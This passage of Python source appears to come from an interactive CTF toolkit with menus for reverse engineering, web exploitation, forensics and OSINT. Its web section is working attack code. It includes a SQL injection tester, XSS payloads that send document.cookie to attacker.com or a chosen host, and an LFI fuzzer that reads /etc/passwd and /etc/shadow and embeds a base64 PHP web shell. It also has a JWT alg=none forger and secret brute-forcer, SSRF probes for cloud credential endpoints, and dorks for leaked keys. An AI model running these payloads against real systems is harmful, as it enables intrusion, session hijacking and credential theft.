    asm = _run(f"objdump -d '{path}' 2>/dev/null")

    for name, pat in patterns.items():
        if re.search(pat, strs + asm, re.IGNORECASE):
            warn(f"DETECTED: {name}")
            found = True

    if not found:
        ok("No obvious anti-debug patterns detected.")
    else:
        info("Bypass hints:")
        info("  strace ./binary 2>&1 | grep ptrace")
        info("  GDB: set follow-fork-mode child")
        info("  Patch ptrace call to NOP (use Binary Patcher above)")

def elf_header():
    section("ELF HEADER PARSER")
    path = get_input("ELF binary path:")
    try:
        with open(path, 'rb') as f:
            data = f.read(64)
        if data[:4] != b'\x7fELF':
            warn("Not an ELF file.")
            return
        ei_class  = {1:'32-bit', 2:'64-bit'}.get(data[4], '?')
        ei_data   = {1:'little-endian', 2:'big-endian'}.get(data[5], '?')
        ei_type   = {1:'REL',2:'EXEC',3:'DYN',4:'CORE'}.get(struct.unpack_from('<H',data,16)[0],'?')
        ei_machine= {0x3e:'x86-64', 0x28:'ARM', 0xb7:'AArch64', 3:'x86'}.get(struct.unpack_from('<H',data,18)[0],'?')
        ei_entry  = struct.unpack_from('<Q' if ei_class=='64-bit' else '<I', data, 24)[0]

        print(f"""
  Class:    {C.GREEN}{ei_class}{C.RESET}
  Encoding: {C.GREEN}{ei_data}{C.RESET}
  Type:     {C.GREEN}{ei_type}{C.RESET}
  Machine:  {C.GREEN}{ei_machine}{C.RESET}
  Entry:    {C.GREEN}0x{ei_entry:016x}{C.RESET}
        """)
    except Exception as ex:
        err(f"Error: {ex}")
        info("Try: readelf -h binary")

def re_checklist():
    section("RE WORKFLOW CHECKLIST")
    steps = [
        ("File ID",        "file ./binary && xxd binary | head -2"),
        ("Strings",        "strings -a binary | grep -Ei 'flag|key|pass|ctf|win|correct'"),
        ("Symbols",        "nm -D binary 2>/dev/null; readelf -s binary 2>/dev/null"),
        ("Shared libs",    "ldd binary"),
        ("Imports",        "objdump -d binary | grep '<.*@plt>' | sort -u"),
        ("Entry / main",   "objdump -d -M intel binary | awk '/<main>:/,/^$/'"),
        ("Ghidra static",  "Import → Auto-analyze → Find main() → Decompile → Rename vars"),
        ("GDB dynamic",    "gdb ./binary → break main → run → ni/si through key logic"),
        ("Anti-debug",     "strace ./binary 2>&1 | grep ptrace"),
        ("Patch if needed","Binary patcher: NOP comparison jumps or return-value fixup"),
    ]
    for i, (name, cmd) in enumerate(steps, 1):
        input(f"  {C.CYAN}[{i:2}/{len(steps)}] {name:20}{C.RESET}  {C.DIM}(press Enter){C.RESET}")
        print(f"       {C.YELLOW}→ {cmd}{C.RESET}")
    ok("Checklist complete!")

# ══════════════════════════════════════════════════════════════════════════════
#  4. WEB EXPLOITATION
# ══════════════════════════════════════════════════════════════════════════════

def web_menu():
    while True:
        c = menu("WEB EXPLOITATION", [
            "SQLi — Tester (error / boolean / time-based)",
            "XSS — Payload generator",
            "LFI — Path traversal fuzzer",
            "JWT — Decode, none-alg attack, brute secret",
            "Directory brute-forcer (ffuf wrapper)",
            "SSRF — Payload generator",
            "Parameter fuzzer (custom wordlist)",
            "HTTP requester (manual GET/POST with headers)",
            "Web checklist (interactive)",
        ])
        if c == 0: break
        elif c == 1: sqli_tester()
        elif c == 2: xss_payloads()
        elif c == 3: lfi_fuzzer()
        elif c == 4: jwt_attacks()
        elif c == 5: dir_brute()
        elif c == 6: ssrf_payloads()
        elif c == 7: param_fuzzer()
        elif c == 8: http_requester()
        elif c == 9: web_checklist()

def sqli_tester():
    section("SQL INJECTION TESTER")
    if not HAS_REQUESTS:
        err("requests not installed: pip install requests"); return

    url    = get_input("Target URL (include parameter, e.g. http://x/login):")
    param  = get_input("Vulnerable parameter name:")
    method = get_input("Method (get/post):", "post").lower()
    marker = get_input("Success marker in response (e.g. 'Welcome', 'admin'):", "admin")

    payloads_error = ["'", "''", "' OR '1'='1", "' OR 1=1--", "' OR 1=1#",
                      "\" OR \"1\"=\"1", "admin'--", "') OR ('1'='1"]
    payloads_union = ["' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
                      "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT 1,user(),3--",
                      "' UNION SELECT 1,database(),3--", "' UNION SELECT table_name,2,3 FROM information_schema.tables--"]
    payloads_time  = ["' AND SLEEP(2)--", "' AND (SELECT * FROM (SELECT(SLEEP(2)))a)--",
                      "1; WAITFOR DELAY '0:0:2'--"]

    ok(f"Testing {url}  param={param}  method={method.upper()}")
    print()

    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 CTF-Toolkit'})

    for payload in payloads_error + payloads_union:
        try:
            data = {param: payload}
            if method == 'get':
                r = session.get(url, params=data, timeout=5)
            else:
                r = session.post(url, data=data, timeout=5)

            errors = ['syntax error','mysql','postgresql','ora-','sql server','sqlite',
                      'unterminated','unrecognized','you have an error']
            has_error = any(e in r.text.lower() for e in errors)
            has_success = marker.lower() in r.text.lower()
            has_union = 'information_schema' in payload.lower() and len(r.text) > 100

            if has_success:
                ok(f"{C.GREEN}SUCCESS{C.RESET}  payload={repr(payload)}")
                flag(f"Login bypassed with: {payload}")
            elif has_error:
                warn(f"SQL ERROR  payload={repr(payload)}")
                info(f"  → Error-based SQLi possible. Try sqlmap: sqlmap -u '{url}' --data '{param}=1' --dbs")
        except Exception as ex:
            pass

    # Time-based
    for payload in payloads_time:
        try:
            data = {param: payload}
            t0 = time.time()
            if method == 'get':
                r = session.get(url, params=data, timeout=8)
            else:
                r = session.post(url, data=data, timeout=8)
            elapsed = time.time() - t0
            if elapsed >= 1.8:
                ok(f"{C.GREEN}TIME-BASED BLIND{C.RESET}  ({elapsed:.1f}s)  payload={repr(payload)}")
                info(f"sqlmap: sqlmap -u '{url}' --data '{param}=INJECT*' --technique=T --dbs")
        except: pass

    info("Tip: Run sqlmap for full exploitation:")
    info(f"  sqlmap -u '{url}' --data='{param}=1' --level=5 --risk=3 --dbs")

def xss_payloads():
    section("XSS PAYLOAD GENERATOR")
    payloads = [
        # Basic
        "<script>alert(1)</script>",
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert(document.cookie)>",
        "<svg onload=alert(1)>",
        # Filter bypass
        "<ScRiPt>alert(1)</ScRiPt>",
        "<script>alert`1`</script>",
        "';alert(1)//",
        "\"><script>alert(1)</script>",
        "javascript:alert(1)",
        # Event handlers
        "<body onload=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<select autofocus onfocus=alert(1)>",
        "<video src=_ onerror=alert(1)>",
        # Encoding bypass
        "&lt;script&gt;alert(1)&lt;/script&gt;",
        "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
        # CSP bypass
        "<base href=//attacker.com>",
        "<script src=//attacker.com/xss.js></script>",
        # Stored XSS
        '"><img src=x onerror=fetch("//attacker.com/c="+document.cookie)>',
    ]

    print(f"\n  {C.BOLD}{'#':>3}  Payload{C.RESET}")
    for i, p in enumerate(payloads, 1):
        print(f"  {C.CYAN}{i:3}{C.RESET}  {p}")

    print()
    host = get_input("Your OOB host for cookie stealing (or Enter to skip):")
    if host:
        steal = f'<img src=x onerror=fetch("http://{host}/x?c="+btoa(document.cookie))>'
        ok(f"Cookie stealer payload: {steal}")
        clip(steal)

def lfi_fuzzer():
    section("LFI / PATH TRAVERSAL FUZZER")
    if not HAS_REQUESTS:
        err("requests not installed"); return

    url   = get_input("URL with parameter (e.g. http://x/page.php?file=FUZZ):")
    marker= get_input("Success marker in response:", "root:")

    payloads = [
        "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
        "....//....//etc/passwd", "..%2F..%2Fetc%2Fpasswd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=../config.php",
        "php://input", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        "/etc/passwd", "/etc/shadow", "/etc/hosts",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\Windows\\win.ini",
        "../../../../../../../../etc/passwd%00",
        "..././..././..././etc/passwd",
    ]

    session = requests.Session()
    for p in payloads:
        try:
            target = url.replace('FUZZ', quote(p))
            if 'FUZZ' not in url:
                err("URL must contain FUZZ placeholder"); return
            r = session.get(target, timeout=5)
            if marker.lower() in r.text.lower() or len(r.text) > 200:
                ok(f"{C.GREEN}HIT{C.RESET}  payload={repr(p)}")
                if 'base64' in p:
                    # Try to decode b64 response
                    try:
                        match = re.search(r'[A-Za-z0-9+/=]{40,}', r.text)
                        if match:
                            decoded = base64.b64decode(match.group()).decode('utf-8','replace')
                            ok(f"Decoded PHP source:\n{decoded[:500]}")
                    except: pass
                else:
                    info(f"Response snippet: {r.text[:200]}")
        except: pass

def jwt_attacks():
    section("JWT ATTACKS")
    token = get_input("JWT token (or Enter for demo):", 
                      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.abc")

    parts = token.split('.')
    if len(parts) != 3:
        err("Invalid JWT format (need header.payload.signature)"); return

    def b64pad(s):
        return s + '=' * (-len(s) % 4)

    try:
        header  = json.loads(base64.b64decode(b64pad(parts[0])).decode())
        payload = json.loads(base64.b64decode(b64pad(parts[1])).decode())
    except Exception as ex:
        err(f"Decode error: {ex}"); return

    ok(f"Header:  {json.dumps(header,  indent=2)}")
    ok(f"Payload: {json.dumps(payload, indent=2)}")
    print()

    attack = get_input("Attack: (1) alg=none  (2) brute HS256 secret  (3) modify payload:", "1")

    if attack == "1":
        # None algorithm bypass
        new_header = base64.b64encode(json.dumps({**header, "alg": "none"}).encode()).decode().rstrip('=')
        new_pay = parts[1]
        forged = f"{new_header}.{new_pay}."
        ok(f"Forged token (alg=none): {C.GREEN}{forged}{C.RESET}")
        clip(forged)

    elif attack == "2":
        wordlist = get_input("Wordlist path:", "/usr/share/wordlists/rockyou.txt")
        if not os.path.exists(wordlist):
            err(f"Wordlist not found: {wordlist}"); return
        import hmac
        msg = f"{parts[0]}.{parts[1]}".encode()
        sig = base64.urlsafe_b64decode(b64pad(parts[2]))
        info(f"Brute-forcing HS256 secret...")
        count = 0
        with open(wordlist, 'rb') as f:
            for line in f:
                secret = line.strip()
                count += 1
                computed = hmac.new(secret, msg, hashlib.sha256).digest()
                if computed == sig:
                    ok(f"SECRET FOUND: {C.GREEN}{secret.decode()}{C.RESET}  (after {count} attempts)")
                    clip(secret.decode())
                    return
                if count % 100000 == 0:
                    print(f"\r  {C.DIM}Tried {count:,}...{C.RESET}", end='', flush=True)
        warn("Secret not found in wordlist.")

    elif attack == "3":
        field = get_input("Field to modify (e.g. 'user', 'role', 'admin'):")
        value = get_input("New value:")
        # Try to set as bool/int
        if value.lower() == 'true': value = True
        elif value.lower() == 'false': value = False
        elif value.isdigit(): value = int(value)

        new_payload = {**payload, field: value}
        new_pay_b64 = base64.b64encode(json.dumps(new_payload, separators=(',',':')).encode()).decode().rstrip('=')
        modified = f"{parts[0]}.{new_pay_b64}.{parts[2]}"
        ok(f"Modified token: {C.GREEN}{modified}{C.RESET}")
        warn("Signature is still original — combine with alg=none or known secret for full attack.")
        clip(modified)

def dir_brute():
    section("DIRECTORY BRUTE-FORCER")
    url      = get_input("Base URL (e.g. http://target.com):")
    wordlist = get_input("Wordlist:", "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt")
    ext      = get_input("File extensions (comma-sep, or Enter for dirs only):", "php,html,txt,bak,old")

    cmd = f"ffuf -u {url}/FUZZ -w {wordlist} -mc 200,301,302,403 -t 40"
    if ext:
        cmd += f" -e .{ext.replace(',',',.')}"

    info(f"Running: {cmd}")
    if not os.path.exists('/usr/bin/ffuf') and not os.path.exists('/usr/local/bin/ffuf'):
        warn("ffuf not found. Install: sudo apt install ffuf")
        info("Alternative with curl (slow):")
        info(f"  while read w; do r=$(curl -so /dev/null -w '%{{http_code}}' {url}/$w); [ $r -ne 404 ] && echo \"$r $w\"; done < {wordlist}")
    else:
        os.system(cmd)

def ssrf_payloads():
    section("SSRF PAYLOAD GENERATOR")
    print(f"""
  {C.BOLD}Internal targets to probe:{C.RESET}

  {C.CYAN}Cloud metadata:{C.RESET}
    http://169.254.169.254/latest/meta-data/                (AWS)
    http://169.254.169.254/latest/meta-data/iam/security-credentials/
    http://metadata.google.internal/computeMetadata/v1/     (GCP)
    http://169.254.169.254/metadata/v1/                     (DigitalOcean)
    http://100.100.100.200/latest/meta-data/                 (Alibaba)

  {C.CYAN}Internal services:{C.RESET}
    http://localhost/
    http://127.0.0.1/
    http://[::1]/
    http://0.0.0.0/
    http://127.0.0.1:22/      (SSH banner)
    http://127.0.0.1:3306/    (MySQL banner)
    http://127.0.0.1:6379/    (Redis)
    http://127.0.0.1:8080/    (Internal app)
    http://127.0.0.1:8500/v1/agent/members  (Consul)

  {C.CYAN}Filter bypass variants:{C.RESET}
    http://0x7f000001/         (127.0.0.1 in hex)
    http://2130706433/         (127.0.0.1 as decimal)
    http://127.1/              (short form)
    http://127.0.0.1.nip.io/   (DNS rebinding)
    dict://127.0.0.1:6379/     (Dict protocol)
    gopher://127.0.0.1:6379/_* (Gopher for Redis)
    file:///etc/passwd         (Local file)
    """)

def param_fuzzer():
    section("PARAMETER FUZZER")
    if not HAS_REQUESTS:
        err("requests not installed"); return

    url    = get_input("URL (FUZZ in param value, e.g. http://x/?id=FUZZ):")
    wlist  = get_input("Wordlist (one word per line):", "")
    marker = get_input("Interesting response marker:", "")

    if not wlist or not os.path.exists(wlist):
        # Use built-in tiny wordlist
        words = list(map(str, range(1,101))) + ['admin','guest','test','1 OR 1=1','<script>alert(1)</script>',
                '../etc/passwd','null','true','false','undefined','0','999999','0x01']
    else:
        with open(wlist) as f:
            words = [l.strip() for l in f if l.strip()]

    session = requests.Session()
    prev_len = None
    for w in words:
        try:
            target = url.replace('FUZZ', quote(str(w)))
            r = session.get(target, timeout=4)
            diff = "" if prev_len is None else f"  Δ{r.content.__len__()-prev_len:+d}"
            hit = (marker and marker.lower() in r.text.lower()) or \
                  (not marker and r.status_code not in [404, 400])
            if hit:
                ok(f"{r.status_code}  len={len(r.content)}{diff}  word={repr(w)}")
            prev_len = len(r.content)
        except: pass

def http_requester():
    section("HTTP REQUESTER")
    if not HAS_REQUESTS:
        err("requests not installed"); return

    url     = get_input("URL:")
    method  = get_input("Method (GET/POST/PUT/DELETE/OPTIONS):", "GET").upper()
    headers = {}
    print("  Add headers (key: value). Empty line to finish:")
    while True:
        h = get_input("  Header:")
        if not h: break
        if ':' in h:
            k, v = h.split(':', 1)
            headers[k.strip()] = v.strip()

    body = None
    if method in ['POST','PUT','PATCH']:
        body = get_input("Body (raw, JSON, or URL-encoded):")

    try:
        r = requests.request(method, url, headers=headers, data=body, timeout=10, verify=False)
        ok(f"Status: {r.status_code}  Length: {len(r.content)}")
        print(f"\n{C.CYAN}=== RESPONSE HEADERS ==={C.RESET}")
        for k, v in r.headers.items():
            print(f"  {k}: {v}")
        print(f"\n{C.CYAN}=== RESPONSE BODY (first 2000 chars) ==={C.RESET}")
        print(r.text[:2000])
        flag_match = re.search(r'[A-Za-z_]{2,10}\{[^}]+\}', r.text)
        if flag_match:
            flag(flag_match.group())
            clip(flag_match.group())
    except Exception as ex:
        err(f"Request failed: {ex}")

def web_checklist():
    section("WEB EXPLOITATION CHECKLIST")
    steps = [
        ("Recon", "whatweb URL; wappalyzer; view source; robots.txt; sitemap.xml"),
        ("Tech fingerprint", "Look for /phpmyadmin, /.git, /.env, /admin, /api/v1"),
        ("Cookie audit", "Decode cookies; check HttpOnly/Secure flags; try cookie manipulation"),
        ("SQLi test", "Add ' to every parameter. Check for SQL errors or behavior changes."),
        ("XSS test", "<script>alert(1)</script> in all inputs. Check reflected output."),
        ("LFI test", "?file=../../../etc/passwd  or  ?page=php://filter/..."),
        ("IDOR test", "Change numeric IDs in URL, cookie, body. Try negative/zero values."),
        ("Auth bypass", "Try admin:admin, ' OR 1=1--, empty password, JWT none alg"),
        ("JWT check", "Decode JWT. Try alg=none. Brute secret if HS256."),
        ("SSRF test", "Any URL parameter? Try http://127.0.0.1, http://169.254.169.254"),
        ("SSTI test", "{{7*7}} in all template fields. 49 = vulnerable to SSTI."),
        ("Source/headers", "View page source for comments, hidden fields, API keys, flags"),
    ]
    for i, (name, tip) in enumerate(steps, 1):
        input(f"  {C.CYAN}[{i:2}/{len(steps)}] {name:18}{C.RESET}  (press Enter)")
        print(f"         {C.YELLOW}→ {tip}{C.RESET}")
    ok("Checklist complete!")

# ══════════════════════════════════════════════════════════════════════════════
#  5. FORENSICS
# ══════════════════════════════════════════════════════════════════════════════

def forensics_menu():
    while True:
        c = menu("FORENSICS", [
            "File analysis (type, entropy, strings, binwalk)",
            "Steganography tester (steg detection)",
            "PCAP quick analyser (Wireshark summary via tshark)",
            "Metadata extractor (exiftool wrapper)",
            "File carver (binwalk extractor)",
            "Hex viewer (xxd wrapper)",
            "Image pixel LSB extractor (PNG)",
            "Entropy calculator",
        ])
        if c == 0: break
        elif c == 1: file_analysis()
        elif c == 2: steg_tester()
        elif c == 3: pcap_analyser()
        elif c == 4: metadata_extractor()
        elif c == 5: file_carver()
        elif c == 6: hex_viewer()
        elif c == 7: lsb_extract()
        elif c == 8: entropy_calc()

def file_analysis():
    section("FILE ANALYSIS")
    path = get_input("File path:")
    if not os.path.exists(path): err("File not found"); return

    print(f"\n{C.CYAN}── File type ──{C.RESET}")
    print(_run(f"file '{path}'"))

    print(f"\n{C.CYAN}── Size ──{C.RESET}")
    print(f"  {os.path.getsize(path):,} bytes")

    print(f"\n{C.CYAN}── Magic bytes (first 32) ──{C.RESET}")
    with open(path, 'rb') as f:
        magic = f.read(32)
    print(f"  {magic.hex()}")
    print(f"  {repr(magic)}")

    print(f"\n{C.CYAN}── Interesting strings ──{C.RESET}")
    result = _run(f"strings -a '{path}' | grep -Ei 'flag|ctf|key|pass|secret|http|ftp|admin'")
    for line in result.split('\n')[:20]:
        if line.strip():
            fmatch = re.search(r'[A-Za-z_]{2,10}\{[^}]+\}', line)
            color = C.GREEN if fmatch else C.WHITE
            print(f"  {color}{line}{C.RESET}")
            if fmatch: flag(fmatch.group())

    print(f"\n{C.CYAN}── Hashes ──{C.RESET}")
    with open(path, 'rb') as f:
        data = f.read()
    print(f"  MD5:    {hashlib.md5(data).hexdigest()}")
    print(f"  SHA1:   {hashlib.sha1(data).hexdigest()}")
    print(f"  SHA256: {hashlib.sha256(data).hexdigest()}")

def steg_tester():
    section("STEGANOGRAPHY TESTER")
    path = get_input("Image/file path:")
    if not os.path.exists(path): err("File not found"); return

    checks = [
        ("stegseek (fast)",    f"stegseek '{path}' /usr/share/wordlists/rockyou.txt 2>&1 | head -5"),
        ("steghide (no pass)", f"steghide extract -sf '{path}' -p '' 2>&1"),
        ("binwalk embed",      f"binwalk '{path}' 2>&1 | head -20"),
        ("strings grep",       f"strings -a '{path}' | grep -Ei 'flag|ctf|key' | head -10"),
        ("zsteg (PNG/BMP)",    f"zsteg '{path}' 2>&1 | head -20"),
        ("exiftool",           f"exiftool '{path}' 2>&1 | head -20"),
        ("xxd tail",           f"xxd '{path}' | tail -5"),
    ]

    for name, cmd in checks:
        out = _run(cmd).strip()
        if out and 'command not found' not in out.lower():
            print(f"\n  {C.CYAN}── {name} ──{C.RESET}")
            for line in out.split('\n')[:6]:
                fmatch = re.search(r'[A-Za-z_]{2,10}\{[^}]+\}', line)
                color = C.GREEN if fmatch else C.WHITE
                print(f"    {color}{line}{C.RESET}")
                if fmatch: flag(fmatch.group())

def pcap_analyser():
    section("PCAP ANALYSER")
    path = get_input("PCAP file path:")
    if not os.path.exists(path): err("File not found"); return

    cmds = [
        ("Protocol summary",  f"tshark -r '{path}' -q -z io,phs 2>/dev/null | head -30"),
        ("HTTP requests",     f"tshark -r '{path}' -Y http.request -T fields -e http.host -e http.request.uri 2>/dev/null | head -20"),
        ("DNS queries",       f"tshark -r '{path}' -Y dns.qry.type==1 -T fields -e dns.qry.name 2>/dev/null | sort -u | head -20"),
        ("Credentials",       f"tshark -r '{path}' -Y 'ftp or http.authorization or smtp' -T fields -e ftp.request.command -e ftp.request.arg 2>/dev/null | head -20"),
        ("Strings in PCAP",   f"strings -a '{path}' | grep -Ei 'flag|ctf|pass|key|secret' | head -20"),
        ("Export HTTP files",  f"tshark -r '{path}' --export-objects http,/tmp/pcap_export 2>/dev/null && ls /tmp/pcap_export/ 2>/dev/null"),
    ]

    for name, cmd in cmds:
        out = _run(cmd).strip()
        if out:
            print(f"\n  {C.CYAN}── {name} ──{C.RESET}")
            for line in out.split('\n')[:10]:
                if line.strip():
                    fmatch = re.search(r'[A-Za-z_]{2,10}\{[^}]+\}', line)
                    color = C.GREEN if fmatch else C.WHITE
                    print(f"    {color}{line}{C.RESET}")
                    if fmatch: flag(fmatch.group())

def metadata_extractor():
    section("METADATA EXTRACTOR")
    path = get_input("File path:")
    out = _run(f"exiftool -a -u '{path}' 2>/dev/null || python3 -c \"\nimport struct,sys\nwith open(sys.argv[1],'rb') as f: d=f.read()\nprint('Size:', len(d))\n\" '{path}'")
    for line in out.split('\n'):
        fmatch = re.search(r'[A-Za-z_]{2,10}\{[^}]+\}', line)
        color = C.GREEN if fmatch else C.WHITE
        print(f"  {color}{line}{C.RESET}")
        if fmatch: flag(fmatch.group())

def file_carver():
    section("FILE CARVER (binwalk)")
    path = get_input("File path:")
    out_dir = path + "_extracted"
    info(f"Running: binwalk -e '{path}' --directory='{out_dir}'")
    out = _run(f"binwalk -e '{path}' -C '{out_dir}' 2>&1")
    print(out[:2000])
    if os.path.exists(out_dir):
        ok(f"Extracted to: {out_dir}")
        for root, dirs, files in os.walk(out_dir):
            for fn in files:
                fpath = os.path.join(root, fn)
                strs = _run(f"strings -a '{fpath}' | grep -Ei 'flag|ctf' | head -3")
                if strs.strip():
                    ok(f"  {fpath}: {strs.strip()[:80]}")

def hex_viewer():
    section("HEX VIEWER")
    path = get_input("File path:")
    start = int(get_input("Start offset (decimal):", "0"))
    length = int(get_input("Bytes to show:", "256"))

    try:
        with open(path, 'rb') as f:
            f.seek(start)
            data = f.read(length)

        for i in range(0, len(data), 16):
            chunk = data[i:i+16]
            hex_part = ' '.join(f'{b:02x}' for b in chunk)
            ascii_part = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in chunk)
            print(f"  {C.DIM}{start+i:08x}{C.RESET}  {C.CYAN}{hex_part:<47}{C.RESET}  {C.WHITE}{ascii_part}{C.RESET}")
    except Exception as ex:
        err(f"Error: {ex}")

def lsb_extract():
    section("LSB STEGANOGRAPHY EXTRACTOR (PNG)")
    try:
        import importlib
        png_path = get_input("PNG file path:")
        # Pure Python LSB without PIL (fallback)
        info("Attempting PNG LSB extraction...")

        # Try PIL first
        try:
            from PIL import Image
            img = Image.open(png_path).convert('RGB')
            pixels = list(img.getdata())
            bits = ''
            for r, g, b in pixels:
                bits += str(r & 1) + str(g & 1) + str(b & 1)
            chars = [chr(int(bits[i:i+8], 2)) for i in range(0, len(bits)-7, 8)]
            text = ''.join(chars)
            printable = ''.join(c for c in text if 32 <= ord(c) <= 126)
            ok(f"LSB data (first 200 printable chars): {printable[:200]}")
            fmatch = re.search(r'[A-Za-z_]{2,10}\{[^}]+\}', printable)
            if fmatch:
                flag(fmatch.group())
                clip(fmatch.group())
        except ImportError:
            warn("PIL not installed: pip install Pillow")
            info("Alternative: use stegsolve.jar or zsteg")
    except Exception as ex:
        err(f"Error: {ex}")

def entropy_calc():
    section("ENTROPY CALCULATOR")
    path = get_input("File path:")
    try:
        with open(path, 'rb') as f:
            data = f.read()
        freq = Counter(data)
        total = len(data)
        entropy = -sum((c/total) * math.log2(c/total) for c in freq.values() if c > 0)
        ok(f"Shannon entropy: {entropy:.4f} bits/byte")
        if entropy > 7.9:
            warn("Very high entropy (>7.9) — likely encrypted or compressed")
        elif entropy > 6.0:
            info("Moderate entropy — may contain compressed sections")
        else:
            ok("Low entropy — likely contains structured/text data")

        # Sliding window entropy
        show_window = get_input("Show sliding window entropy? (y/n):", "n")
        if show_window.lower() == 'y':
            window = 256
            print(f"\n  {C.DIM}Offset       Entropy{C.RESET}")
            for i in range(0, min(len(data), 4096), window):
                chunk = data[i:i+window]
                if len(chunk) < 8: break
                freq2 = Counter(chunk)
                t = len(chunk)
                ent = -sum((c/t)*math.log2(c/t) for c in freq2.values() if c > 0)
                bar = '█' * int(ent * 4)
                print(f"  0x{i:06x}   {ent:.2f}  {C.CYAN}{bar}{C.RESET}")
    except Exception as ex:
        err(f"Error: {ex}")

# ══════════════════════════════════════════════════════════════════════════════
#  6. OSINT
# ══════════════════════════════════════════════════════════════════════════════

def osint_menu():
    while True:
        c = menu("OSINT", [
            "Domain / IP recon",
            "Email header analyser",
            "Reverse image / coordinates (guide)",
            "Username search (guide + Sherlock)",
            "Geolocation from metadata",
            "Google dork generator",
        ])
        if c == 0: break
        elif c == 1: domain_recon()
        elif c == 2: email_header()
        elif c == 3: osint_image_guide()
        elif c == 4: username_search()
        elif c == 5: geo_from_meta()
        elif c == 6: google_dorks()

def domain_recon():
    section("DOMAIN / IP RECON")
    target = get_input("Domain or IP:")
    cmds = [
        ("WHOIS",     f"whois {target} 2>/dev/null | head -30"),
        ("DNS A",     f"dig +short A {target} 2>/dev/null || nslookup {target}"),
        ("DNS MX",    f"dig +short MX {target}"),
        ("DNS TXT",   f"dig +short TXT {target}"),
        ("DNS NS",    f"dig +short NS {target}"),
        ("Reverse",   f"dig +short -x {target}"),
        ("HTTP head", f"curl -sI {target} --max-time 5 | head -20"),
        ("Ping",      f"ping -c 3 {target} 2>/dev/null | tail -3"),
    ]
    for name, cmd in cmds:
        out = _run(cmd).strip()
        if out:
            print(f"\n  {C.CYAN}── {name} ──{C.RESET}")
            print('\n'.join(f"    {l}" for l in out.split('\n')[:8]))

def email_header():
    section("EMAIL HEADER ANALYSER")
    info("Paste email headers below. Enter an empty line to finish.")
    lines = []
    while True:
        l = input()
        if not l.strip() and lines: break
        lines.append(l)
    headers_raw = '\n'.join(lines)

    patterns = {
        'From':         r'From:.*',
        'Reply-To':     r'Reply-To:.*',
        'Return-Path':  r'Return-Path:.*',
        'Received':     r'Received: from.*',
        'X-Originating-IP': r'X-Originating-IP:.*',
        'DKIM':         r'DKIM-Signature:.*',
        'SPF':          r'Received-SPF:.*',
        'Message-ID':   r'Message-ID:.*',
    }
    for name, pat in patterns.items():
        m = re.findall(pat, headers_raw, re.IGNORECASE)
        for match in m[:2]:
            ok(f"{name:20} {match[:80]}")

def osint_image_guide():
    section("REVERSE IMAGE OSINT GUIDE")
    print(f"""
  {C.CYAN}Step 1 — Extract metadata:{C.RESET}
    exiftool image.jpg
    Look for: GPS coordinates, Camera make/model, Software, Author, Comment

  {C.CYAN}Step 2 — Reverse image search:{C.RESET}
    → Google Images: images.google.com → upload
    → TinEye: tineye.com
    → Yandex Images (best for faces/places): yandex.com/images

  {C.CYAN}Step 3 — Geolocation from image content:{C.RESET}
    → Look for: street signs, license plates, landmarks, vegetation, shadows
    → GeoGuessr techniques: sun angle = rough latitude/time
    → Google Street View verification

  {C.CYAN}Step 4 — Metadata GPS decode:{C.RESET}
    GPS coords are often in DMS format: 1° 17' 27.60" N → 1.290999°
    Convert: degrees + minutes/60 + seconds/3600
    """)

def username_search():
    section("USERNAME SEARCH")
    username = get_input("Username to search:")
    info(f"Searching for: {username}")

    # Sherlock
    if os.path.exists('/usr/share/sherlock/sherlock.py') or _run('which sherlock').strip():
        os.system(f"sherlock {username} 2>/dev/null | grep '\[+\]' | head -20")
    else:
        info("Sherlock not installed: pip install sherlock-project")
        info("Manual checks:")
        sites = [
            f"https://github.com/{username}",
            f"https://twitter.com/{username}",
            f"https://instagram.com/{username}",
            f"https://reddit.com/user/{username}",
            f"https://linkedin.com/in/{username}",
            f"https://t.me/{username}",
            f"https://keybase.io/{username}",
        ]
        for s in sites:
            print(f"    {C.CYAN}{s}{C.RESET}")

def geo_from_meta():
    section("GEOLOCATION FROM METADATA")
    path = get_input("File path:")
    out = _run(f"exiftool '{path}' 2>/dev/null | grep -i 'gps\\|latitude\\|longitude\\|location\\|position'")
    if not out.strip():
        warn("No GPS metadata found.")
        return
    print(out)

    # Try to parse decimal GPS
    lat_m = re.search(r'GPS Latitude\s*:\s*([\d.]+)\s*(N|S)', out)
    lon_m = re.search(r'GPS Longitude\s*:\s*([\d.]+)\s*(E|W)', out)
    if lat_m and lon_m:
        lat = float(lat_m.group(1)) * (-1 if lat_m.group(2) == 'S' else 1)
        lon = float(lon_m.group(1)) * (-1 if lon_m.group(2) == 'W' else 1)
        ok(f"Decimal coordinates: {lat}, {lon}")
        ok(f"Google Maps: https://maps.google.com/?q={lat},{lon}")
        clip(f"https://maps.google.com/?q={lat},{lon}")

def google_dorks():
    section("GOOGLE DORK GENERATOR")
    target = get_input("Target domain or organisation:")
    dorks = [
        f'site:{target} filetype:pdf',
        f'site:{target} filetype:xls OR filetype:csv',
        f'site:{target} "password" OR "passwd" OR "secret"',
        f'site:{target} intitle:"index of"',
        f'site:{target} ext:php inurl:config',
        f'site:{target} inurl:/admin',
        f'site:{target} "API_KEY" OR "api_key" OR "apikey"',
        f'site:{target} "BEGIN RSA PRIVATE KEY"',
        f'"{target}" site:pastebin.com',
        f'"{target}" site:github.com',
        f'"{target}" site:trello.com',
        f'inurl:"{target}" ext:log',
    ]
    for d in dorks:
        url = f"https://www.google.com/search?q={quote(d)}"
        print(f"  {C.CYAN}{d}{C.RESET}")
        print(f"    {C.DIM}{url}{C.RESET}\n")

# ══════════════════════════════════════════════════════════════════════════════
#  7. NETWORKING
# ══════════════════════════════════════════════════════════════════════════════

def net_menu():
    while True:
        c = menu("NETWORKING", [
